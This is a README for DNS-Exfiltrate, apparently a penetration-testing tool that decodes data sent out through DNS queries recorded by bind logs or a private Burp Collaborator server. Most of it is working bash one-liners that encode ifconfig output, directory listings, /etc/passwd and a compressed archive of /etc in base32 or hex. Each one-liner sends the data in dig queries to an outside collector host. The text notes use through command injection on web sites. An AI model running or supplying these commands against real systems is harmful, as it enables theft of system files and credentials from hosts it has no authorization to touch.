# DNS-Exfiltrate

Parses bind query logs or private Burp Collaborator output to decode base32- or hex-encoded exfiltrated data. 

Burp Collaborator allows prepending hostnames to the provided address. You may prepend names (maximum length of a DNS label is 63 bytes), assuming it uses characters safe in a DNS query (such as hex- or base32-encoded data, see below). You may also prepend multiple names, as long as the entire request is 253 bytes or less. This allows exfiltration (including blind exfiltration) of data via DNS. Works best with a private Burp Collaborator server (or any DNS server that logs queries). You may also do this with a public server and a sniffer such as tcpdump (no DNS server required). I plan to add pcap support in the future.

`dns-parse.py` parses native bind query logs, or private Burp Collaborator output, which may be logged via `tee` (requires "logLevel" : "DEBUG" in collaborator.config):

```
java -jar burpsuite_pro.jar --collaborator-server | tee collaborator.log
```

Assumes hostnames are encoded in base32 (`A-Z`, `2-7`) or lowercase hex (`0-9`, `a-f`), which which is safe for DNS queries (and can typically be sent via `bash` on Linux/Unix systems using `base32` or `xxd`). base32 is twice as efficient as hex. The `=` character (used to pad base32-encoded data to an 8 byte boundary) is not DNS safe, but can be trimmed using `tr -d =` on Linux/Unix systems. `dns-parse.py` appends any missing `=` characters. base64 does not work due to `/` and `+`.

Thanks and credit to [Xavier Mertens](https://www.sans.org/profiles/xavier-mertens/) for his excellent [Internet Storm Center](https://isc.sans.edu/) post: [DNS Query Length... Because Size Does Matter](https://isc.sans.edu/diary/DNS+Query+Length...+Because+Size+Does+Matter/22326)

## Use cases (bash):

In the examples below: `<Name>` is the random name provided by Burp Collaborator (AKA, the interaction ID). For example: use `q3uv485lz802ad6a7xz6c2izvq1hp6` if your Beef Collaborator address is `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`. Use a different query ID for each transfer.

For `base32`, the `-w63` flag specifies line wrapping at 63 bytes. For `xxd` (hex): the `-p` flag is 'output  in  postscript  continuous  hexdump style', and `-c31` is count of 31 hex characters (62 bytes sent).

If results are unreliable you can specify the name or IP of the DNS server via `dig @`...

### Send STDOUT from a command

#### base32
```
ifconfig | base32 -w63 | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
```
```
ls / | base32 -w63 | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### hex
```
ifconfig | xxd -p -c31 | while read a; do dig $a.<Name>.<DNS Server>; done;
```
```
ls / | xxd -p -c31 | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### Decode the output
```
dns-parse.py <Name> (query.log|collaborator.log)
```

### Exfiltrate a file

#### base32
```
base32 -w63 < /etc/passwd | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### hex
```
xxd -p -c31 < /etc/passwd | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### Decode the file
```
dns-parse.py <Name> (query.log|collaborator.log)
```

### Exfiltrate a compressed file:

#### base32
```
gzip - < /etc/passwd | base32 -w63 | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### hex
```
gzip - < /etc/passwd | xxd -p -c31 | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### Decode/unzip the file
```
dns-parse.py <Name> (query.log|collaborator.log) | zcat
```

### Exfiltrate a compressed tar archive of a directory:

Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.

#### base32
```
tar czf - /etc | base32 -w63 | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### hex
```
tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<Name>.<DNS Server>; done;
```

#### Decode/save the tar archive
```
dns-parse.py <Name> (query.log|collaborator.log) > exfiltrated.tgz
```

## Sample Logs

[collaborator1.log](collaborator1.log) (STDOUT exfiltration via base32):
```
dns-parse.py qysipx9bbnhv0u5ez2dkmzuh68cy0n collaborator1.log
```

[collaborator2.log](collaborator2.log) (/etc/passwd exfiltration via base32):
```
dns-parse.py 165cmzb1cu1m3wso0k1k3udr7id91y collaborator2.log
```

[collaborator3.log](collaborator3.log) (gzipped /etc/passwd exfiltration via base32):
```
dns-parse.py l9vn8f4xr94q4f8j3t6ba8i5bwhm5b collaborator3.log | zcat
```
